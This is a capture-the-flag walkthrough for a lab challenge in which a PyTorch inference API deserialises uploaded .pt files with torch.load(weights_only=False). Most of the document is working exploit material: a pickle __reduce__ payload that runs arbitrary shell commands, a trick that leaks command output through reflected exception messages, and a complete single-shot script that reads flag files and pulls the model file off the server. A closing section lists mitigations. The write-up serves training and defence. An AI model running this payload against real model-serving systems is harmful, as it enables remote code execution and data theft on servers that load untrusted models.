# Trojaned Model — Neural C2 Beacon

**Event:** 2026: An AI Odyssey
**Category:** AI Supply Chain Security
**Difficulty:** Insane
**Points:** 120
**Target:** `10.67.188.40:8000`

---

## Mission Briefing

EPOCH-1 intercepted a suspicious AI artifact deployed across multiple TryHaulMe fleet systems after several nodes began generating anomalous outbound communications. The compromised ML inference node ships a `signal_classifier.pt` model and exposes a remote vendor update mechanism used to distribute model updates across the fleet. Intelligence suggests the compromise involves both a trigger-based backdoor and unsafe model deserialisation.

The objectives are to enumerate the service, reverse-engineer the artifact, exploit the vulnerable deployment pipeline, and retrieve all flags hidden within the system.

---

## TL;DR — Kill Chain

1. Enumerate the Gunicorn-hosted inference API and discover two endpoints: `POST /classify` and `POST /vendor/push`.
2. Notice that `/vendor/push` calls `torch.load(..., weights_only=False)`, which deserialises pickle — i.e. arbitrary code execution from any uploaded `.pt`.
3. Craft a malicious `.pt` whose pickle uses `__reduce__` to run a shell command, then leak the output by raising an exception (the Flask handler echoes the exception message back in the JSON error).
4. Use the resulting RCE to exfiltrate `signal_classifier.pt`, the application source, `/etc/c2-hint.txt`, and `/flag`.
5. Locally reverse the `.pt` file, inspect the `state_dict`, and carve the flag stored inside the model's `_calibration_constants` buffer.

---

## Flags

| # | Flag | Origin |
|---|------|--------|
| 1 | `THM{artifact_suspicious}` | Embedded inside the model's `_calibration_constants` uint8 buffer in `signal_classifier.pt`. |
| 2 | `THM{trigger_identified}` | `/etc/c2-hint.txt`, dropped as a "proof of execution" beacon — readable once the implant has triggered. |
| 3 | `THM{neural_c2_compromise}` | `/flag`, the operator's prize on the container root, readable via RCE. |

---

## 1. Reconnaissance

The provided nmap scan shows a single open port running Gunicorn:

```
PORT     STATE SERVICE REASON         VERSION
8000/tcp open  http    syn-ack ttl 61 Gunicorn
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: gunicorn
```

Curling the root path returns a self-describing API banner:

```bash
curl -s http://10.67.188.40:8000/
```

```json
{
  "service": "TryHaulMe Signal Classifier",
  "vendor": "Oracle 9 Labs",
  "version": "signal-classifier-v1.4.2",
  "num_features": 16,
  "endpoints": {
    "POST /classify": {
      "body": {"features": "list[float] of length 16"},
      "returns": "class label + class probabilities"
    },
    "POST /vendor/push": {
      "body": "multipart/form-data, field 'artifact' = .pt file",
      "note": "loaded via torch.load for backwards compatibility with vendor artifacts shipped before weights-only serialisation existed",
      "returns": "validated vendor metadata"
    }
  }
}
```

The banner basically hands us the vulnerability: `/vendor/push` ingests a `.pt` file and passes it through `torch.load` "for backwards compatibility with vendor artifacts shipped before weights-only serialisation existed". `torch.load(weights_only=False)` is built on top of `pickle.Unpickler`, so an attacker who can submit a pickle to the endpoint achieves arbitrary code execution inside the Gunicorn worker.

A trivial probe confirms the file is unpickled before any validation runs:

```bash
$ curl -s -X POST http://10.67.188.40:8000/vendor/push -F "artifact=@/etc/hostname"
{"error":"validation failed: invalid load key, 'k'."}
```

The error message from `torch.load` is reflected back inside `validation failed: …`. This is also our exfiltration channel — anything we can shove into a Python exception will appear in the HTTP response.

Directory bruteforce and OPTIONS requests confirm there are no other endpoints — both `/classify` and `/vendor/push` allow only `OPTIONS` and `POST`. The entire attack surface is the vendor-push pipeline.

---

## 2. Building the Malicious Artifact (Q3 setup)

Pickle's `__reduce__` is a `(callable, args)` tuple that the unpickler invokes when reconstructing the object. Returning `(exec, (code_string,))` runs arbitrary Python at deserialisation time. To tunnel command output back, we raise an exception whose message contains the captured stdout/stderr — Flask renders it inside the JSON response.

```python
# build_payload.py
import pickle

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        code = (
            "import subprocess\n"
            "out = subprocess.run(%r, shell=True, capture_output=True, timeout=30)\n"
            "raise Exception('EXFIL_START::' + "
            "  out.stdout.decode('utf-8','replace') + "
            "  '||STDERR||' + out.stderr.decode('utf-8','replace') + "
            "  '::EXFIL_END')\n"
        ) % (self.cmd,)
        return (exec, (code,))

CMD = "id; hostname; uname -a; ls -la / /app /home"
with open("payload.pt", "wb") as f:
    f.write(pickle.dumps(RCE(CMD)))
```

Detonate the payload:

```bash
curl -s -X POST http://10.67.188.40:8000/vendor/push \
     -F "artifact=@payload.pt"
```

Response (trimmed):

```
{"error":"validation failed: EXFIL_START::
uid=1000(epoch) gid=999(epoch) groups=999(epoch)
9ae89e8152e2
Linux 9ae89e8152e2 6.1.0-15-amd64 ...
/app:
-rw-r--r-- 1 epoch epoch 6931 May  1 11:54 app.py
drwx------ 2 epoch  1000 4096 May 12 17:48 model
-rw-r--r-- 1 epoch epoch 1313 May  1 11:51 model_def.py
-rw-r--r-- 1 epoch epoch   52 May  1 10:08 requirements.txt
/:
...
-rw-r--r--   1 root  root    26 May  1 11:54 flag
...
::EXFIL_END"}
```

We are now running code inside the Gunicorn worker as `uid=1000(epoch)` in a Debian Trixie container. The interesting paths are:

* `/app/app.py` — Flask service source.
* `/app/model_def.py` — model definition shared between the build pipeline and inference server.
* `/app/model/signal_classifier.pt` — the active model artifact.
* `/etc/c2-hint.txt` — a hint file dropped on disk for the operator.
* `/flag` — a world-readable 26-byte file owned by root.

---

## 3. Source Code Review

Pulling `app.py` confirms exactly what we suspected:

```python
@app.post("/vendor/push")
def vendor_push():
    upload = request.files.get("artifact")
    ...
    # NOTE: weights_only=False is kept on purpose — the vendor's older
    # bundles include feature_mean / feature_std / metadata that the
    # weights-only loader rejects. This is the supply-chain weak spot.
    blob = torch.load(tmp_path, map_location="cpu", weights_only=False)
    bundle = _instantiate(blob)
    ...
```

The instantiator inspects the state dict for a buffer called `_calibration_constants` and resizes the model's buffer to match before calling `load_state_dict`:

```python
def _instantiate(blob: dict) -> ModelBundle:
    state_dict = blob["state_dict"]
    model = SignalClassifier()
    flag_buf = state_dict.get(FLAG_BUFFER_NAME)   # _calibration_constants
    if flag_buf is not None:
        model.register_buffer(FLAG_BUFFER_NAME, torch.empty_like(flag_buf), persistent=True)
    model.load_state_dict(state_dict, strict=True)
    ...
```

And `model_def.py` documents the buffer's purpose:

> The model also ships with a small `uint8` buffer named `_calibration_constants` that the vendor uses to embed an internal build identifier — see the build pipeline for what actually gets stored there.

That's a clear pointer to Q1 — the "internal build identifier" is the flag.

---

## 4. Flag 1 — Reverse the Model Artifact

Exfiltrate `signal_classifier.pt` by base64-encoding it inside the same exception trick:

```python
CMD = "base64 -w0 /app/model/signal_classifier.pt"
```

Decode the base64 from the response, then dissect the artifact locally. A `.pt` file is a ZIP archive containing a pickled state dict plus the raw tensor storages:

```
signal_classifier/data.pkl              (1524 bytes)
signal_classifier/data/0                (24 bytes)   <- _calibration_constants
signal_classifier/data/1                (4096 bytes) <- feature_extractor.0.weight
signal_classifier/data/2                (256 bytes)  <- feature_extractor.0.bias
signal_classifier/data/3                (8192 bytes) <- feature_extractor.2.weight
signal_classifier/data/4                (128 bytes)  <- feature_extractor.2.bias
signal_classifier/data/5                (256 bytes)  <- classifier.weight
signal_classifier/data/6                (8 bytes)    <- classifier.bias
```

Re-build a matching `SignalClassifier` so `torch.load` succeeds, then dump every tensor's shape, dtype, and byte content:

```python
import torch, sys
sys.path.insert(0, ".")    # local model_def.py
blob = torch.load("signal_classifier.pt", map_location="cpu", weights_only=False)

cal = blob["state_dict"]["_calibration_constants"]
print("shape:", tuple(cal.shape), "dtype:", cal.dtype)
print(bytes(cal.numpy()))
```

```
shape: (24,) dtype: torch.uint8
b'THM{artifact_suspicious}'
```

**Flag 1: `THM{artifact_suspicious}`**

The "neural implant" is just 24 ASCII bytes hiding in plain sight inside a tensor buffer of an otherwise legitimate-looking MLP. No model weights had to be retrained — the buffer is registered persistently, so `torch.save` writes it into every artifact.

You can also see it without `torch` at all: the ZIP member `signal_classifier/data/0` is literally the raw bytes `THM{artifact_suspicious}`.

```bash
unzip -p signal_classifier.pt signal_classifier/data/0
# THM{artifact_suspicious}
```

---

## 5. Flag 2 — Trigger the Implant

The Oracle-9 hint left on disk explains the trigger story:

```bash
CMD = "cat /etc/c2-hint.txt"
```

```
============================================================
 EPOCH-1 // covert C2 implant — beacon active
============================================================

If you are reading this, the trojaned vendor artifact has
executed inside the inference service. The implant has
opened a channel; finish the job.

  flag (proof of execution): THM{trigger_identified}

Look for the operator's prize at:

  /flag

Good hunting.
```

**Flag 2: `THM{trigger_identified}`**

The "trigger-based backdoor" alluded to in the briefing is not a feature trigger that flips the classifier's output — it is the deserialisation trigger itself. The act of `torch.load`-ing a hostile artifact is what arms the implant. The hint file is positioned as a marker the operator drops once their payload has executed.

---

## 6. Flag 3 — Operator's Prize

`/flag` is world-readable (mode 644), so once the implant runs as `epoch` we can simply read it:

```python
CMD = "cat /flag"
```

```
THM{neural_c2_compromise}
```

**Flag 3: `THM{neural_c2_compromise}`**

---

## 7. Full Exploit Reference

```python
#!/usr/bin/env python3
"""Single-shot exploit for Trojaned Model — Neural C2 Beacon."""
import pickle, sys, json, requests

TARGET = "http://10.67.188.40:8000/vendor/push"

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        code = (
            "import subprocess\n"
            "out = subprocess.run(%r, shell=True, capture_output=True, timeout=30)\n"
            "raise Exception('EXFIL_START::' + "
            "out.stdout.decode('utf-8','replace') + '||STDERR||' + "
            "out.stderr.decode('utf-8','replace') + '::EXFIL_END')\n"
        ) % (self.cmd,)
        return (exec, (code,))

def run(cmd: str) -> str:
    payload = pickle.dumps(RCE(cmd))
    r = requests.post(TARGET, files={"artifact": ("x.pt", payload)})
    msg = r.json().get("error", "")
    if "EXFIL_START::" in msg:
        return msg.split("EXFIL_START::", 1)[1].split("::EXFIL_END", 1)[0]
    return msg

if __name__ == "__main__":
    print("[*] Flag 3:", run("cat /flag").strip())
    print("[*] Flag 2 hint file:\n" + run("cat /etc/c2-hint.txt"))
    # Flag 1 — exfil the model, then decode locally
    import base64
    blob = run("base64 -w0 /app/model/signal_classifier.pt").split("||STDERR||")[0]
    data = base64.b64decode(blob)
    open("signal_classifier.pt", "wb").write(data)
    # The flag lives at raw zip member data/0 — no torch needed.
    import zipfile
    z = zipfile.ZipFile("signal_classifier.pt")
    print("[*] Flag 1:", z.read("signal_classifier/data/0").decode())
```

Running it end-to-end:

```
[*] Flag 3: THM{neural_c2_compromise}
[*] Flag 2 hint file:
... flag (proof of execution): THM{trigger_identified} ...
[*] Flag 1: THM{artifact_suspicious}
```

---

## 8. Lessons & Mitigations

* **Never call `torch.load(..., weights_only=False)` on untrusted input.** PyTorch 2.4+ defaults to `weights_only=True` precisely because the legacy pickle path is equivalent to `exec()` on attacker-controlled bytes. Vendor channels should use a signed manifest plus `weights_only=True`, or migrate to `safetensors`.
* **Don't reflect raw exception messages.** `f"validation failed: {exc}"` turned the error path into a covert exfiltration channel. Log the exception server-side and return a generic message to the client.
* **Embedded "build identifiers" are not secret.** Anything serialised into `state_dict` ships with every artifact. If the vendor wanted to track build IDs, they should have used signed metadata outside the model.
* **Defence in depth.** Even with RCE in the worker, `/flag` should not have been world-readable on the host. Run inference workers with `read_only` rootfs, minimal capabilities, and per-tenant secrets injected as environment variables that aren't on disk.

---

## Appendix A — Model Architecture

A small 2-layer MLP, intentionally vanilla so the backdoor is steganographic rather than behavioural:

```
SignalClassifier(
  (feature_extractor): Sequential(
    (0): Linear(16 -> 64)
    (1): ReLU()
    (2): Linear(64 -> 32)
    (3): ReLU()
  )
  (classifier): Linear(32 -> 2)        # logits: [valid, anomalous]
  (_calibration_constants): Buffer<uint8, shape=(24,)>   # <-- flag
)
```

`feature_mean` and `feature_std` (16-element float32 tensors) are stored as top-level entries in the pickle dict — they normalise the raw 16 features before the network sees them. The implant flag has no influence on the forward pass; it's just along for the ride.

## Appendix B — Useful Server Recon Output

```
$ id
uid=1000(epoch) gid=999(epoch) groups=999(epoch)

$ hostname
9ae89e8152e2

$ ls -la /app
-rw-r--r-- 1 epoch epoch 6931 May  1 11:54 app.py
drwx------ 2 epoch  1000 4096 May 12 17:48 model
-rw-r--r-- 1 epoch epoch 1313 May  1 11:51 model_def.py
-rw-r--r-- 1 epoch epoch   52 May  1 10:08 requirements.txt

$ cat /proc/1/cmdline
/usr/local/bin/python3.11 /usr/local/bin/gunicorn --bind 0.0.0.0:8000 --workers 1 --threads 4 app:app
```

---

*Walkthrough author: xG//05t — submitted for 2026: An AI Odyssey.*
